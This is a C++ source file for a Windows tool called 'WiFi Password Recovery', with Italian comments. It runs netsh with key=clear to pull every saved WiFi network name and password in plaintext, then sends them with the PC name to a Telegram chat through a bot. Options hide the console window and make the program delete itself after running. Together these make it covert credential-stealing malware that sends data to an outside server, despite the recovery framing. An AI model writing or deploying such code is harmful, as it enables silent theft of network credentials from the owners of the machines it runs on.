#include <iostream>
#include <windows.h>
#include <Essentials.h> // Libreria per semplificare svariate funzioni
#include <EssCurl.h> // Libreria per semplificare l'utilizzo di CURL
#include "funzioni.h"

using namespace std;

int main()
{
	SystemUtils su; // Classe di Essentials per diverse utility generali
	TelegramBot tb; // Classe di EssCurl per semplificare l'utilizzo di un bot Telegram
	SettingsFile sf("settings.ini"); // Classe di Essentials per utilizzare un file di settaggi in modo semplificato
	ConsoleUtils cu; // Classe di Essentials per diverse utility sulla console di Windows
	Log lg("WPR.log"); // Classe di Essentials per gestire in maniera semplice un sistema di log
	CLInterface cli; // Classe per la gestione dell'interfaccia a linea di console
	TextColor tc;

	lg.RWFile(); // Sbianco il file di log
	lg.WriteLog("Inizializzazione."); // Scrivo sul file di log
	string ChatID;
	string buffer;
	string Versione = "1.0.4"; // Versione locale del programma
	bool Debug = false;
	VectString SSID; // Utilizzo i vettori per l'allocazione dinamica (e perché sono belli :3)
	VectString Password;
	VectString Body;
	SendMsg sm;

	cu.ConsoleTitle("WiFi Password Recovery ~ by Criper98"); // Cambio il titolo della finestra di console
	tb.BotToken = "123:ABC";

	if (sf.GetSetting("SetChatID") == "true") // Se "true" avvia la procedura per associare la chat a cui il bot deve mandare il messaggio
	{
		lg.WriteLog("ChatID non impostato, inizio procedura di associazione.");
		PrintTitle(Versione, 1);
		cli.SubTitle("Associazione Chat Telegram", 75, tc.Green);

		cout << "La chat per il bot Telegram non e' associata." << endl;
		cout << "Per associarla scrivere al bot @WiFiPRbot il seguente codice." << endl;

		sf.SetSetting("Chat_ID", GetChatID(tb, lg));
		if (!VerificaChatID(sf, lg))
			return 0;

		sf.SetSetting("SetChatID", "false");
		lg.WriteLog("ChatID associato.");
	}
	else if (sf.GetSetting("SetChatID") == "")
	{
		lg.WriteLog("Errore durante la lettura dei settaggi");
		tc.SetColor(tc.Red);
		cout << "Errore durante la lettura dei settaggi." << endl;
		tc.SetColor(tc.Default);
		Sleep(5000);

		if (sf.GetSetting("AutoDelete") == "true")
			AutoDelete();

		return 0;
	}

	if (sf.GetSetting("DebugMode") == "true")
		Debug = true;
	if (sf.GetSetting("CheckUpdate") == "true")
		CheckUpdate(Versione, lg);
	if (sf.GetSetting("HideConsole") == "true")
		cu.HideConsole();
	else
		if (!EseguiInterfaccia(sf, Versione, tb, lg))
			return 0;

	cout << "\nRecupero password in corso";
	cli.DotsBar();

	ChatID = sf.GetSetting("Chat_ID"); // Leggo l'ID della chat a cui mandare il messaggio Telegram

	if (su.NoOutputCMD("ping api.telegram.org -n 1") != 0) // Controllo che le API siano raggiungibili
	{
		cli.StopBar();
		lg.WriteLog("[Errore]: Impossibile raggiungere le API di Telegram.");
		cout << "Collegamento con le API di Telegram fallito.\nVerificare la connessione a internet e riprovare." << endl;
		Sleep(5000);

		if (sf.GetSetting("AutoDelete") == "true")
			AutoDelete();
		return 0;
	}

	lg.WriteLog("Esecuzione comando \"netsh wlan show profile\".");
	buffer = su.GetCMDOutput("netsh wlan show profile"); // Eseguo il comando per ottenere i profili di rete salvati

	if (buffer.find("Tutti i profili utente") == string::npos) // Se non ci sono profili:
	{
		cli.StopBar(100);
		lg.WriteLog("Nessun profilo di rete wireless trovato.\n******************************\n" + buffer + "\n******************************");
		
		sm.ChatID = ChatID;
		sm.Text = "La postazione " + su.GetPCName() + " non ha una scheda wireless o non ha reti salvate...";
		tb.SendMessage(sm);

		tc.SetColor(tc.Red);
		cout << "\nLa postazione non ha una scheda wireless o non ha reti salvate." << endl;
		tc.SetColor(tc.Default);
		if (Debug)
			cout << buffer << endl;

		Sleep(5000);

		if (sf.GetSetting("AutoDelete") == "true")
			AutoDelete();
		return 0;
	}

	lg.WriteLog("Acquisizione profili.");
	for (int i = 0, j = 0; buffer.find("Tutti i profili utente", i) != string::npos; j++) // Salvo su vettore i nomi dei profili di rete
	{
		SSID.push_back(SimpleFind(buffer, ": ", "\n", j)); // SimpleFind è un substr semplificato con l'implementazione delle iterazioni (j)
		i = buffer.find(": ", i) + 2;
	}
	lg.WriteLog("Profili acquisiti: " + to_string(SSID.size()) + ".");

	if (Debug)
		for (int i = 0; i < SSID.size(); i++)
			cout << "Profilo: " << SSID[i] << endl;

	lg.WriteLog("Acquisizione SSID e Password.");
	for (int i = 0; i < SSID.size(); i++) // Salvo su vettore la password e il vero nome dell'SSID della rete
	{
		buffer = su.GetCMDOutput("netsh wlan show profile name=\"" + SSID[i] + "\" key=clear"); // Comando per ottenere i dettagli del profilo di rete specificato e mostrare in chiaro la password (se c'è)

		if (buffer.find("Contenuto chiave") == string::npos) // Se non c'è la password:
		{
			lg.WriteLog("Password non trovata per il profilo " + SSID[i]);
			Password.push_back("Password non trovata");
			if (Debug)
			{
				cout << "Password non trovata per la rete " << SSID[i] << endl;
				cout << su.GetCMDOutput("netsh wlan show profile name=\"" + SSID[i] + "\" key=clear") << endl;
				system("pause");
			}
		}
		else
			Password.push_back(buffer.substr(buffer.find("Contenuto chiave") + 30, buffer.find("\n", buffer.find("Contenuto chiave")) - 30 - buffer.find("Contenuto chiave"))); // Salvo la password sul vettore

		SSID[i] = buffer.substr(buffer.find("Nome SSID") + 32, buffer.find("\n", buffer.find("Nome SSID")) - 33 - buffer.find("Nome SSID")); // Sovrascrivo il vero SSID della rete su vettore
		if (Debug)
			cout << "SSID: " << SSID[i] << endl << "Password: " << Password[i] << endl;
	}

	lg.WriteLog("Creazione del Buffer.");
	buffer.clear();
	buffer = "Elenco password recuperate dalla postazione " + su.GetPCName() + "\n\n";
	for (int i = 0; i < SSID.size(); i++) // Creo il messaggio da mandare su Telegram
		buffer += "SSID: " + SSID[i] + "\nPWD: " + Password[i] + "\n\n";
	lg.WriteLog("Invio Buffer alla chat " + ChatID);

	sm.ChatID = ChatID;
	sm.Text = buffer;
	tb.SendMessage(sm); // Mando il messaggio

	cli.StopBar(100);
	cout << endl;
	lg.WriteLog("Stampa password.");
	for (int i = 0; i < SSID.size(); i++)
	{
		Body.push_back(SSID[i]);
		Body.push_back(Password[i]);
	}
	cli.Table({"SSID", "Password"}, Body);

	if (sf.GetSetting("HideConsole") == "false")
		system("pause");

	if (sf.GetSetting("AutoDelete") == "true")
		AutoDelete();

	return 0;
}
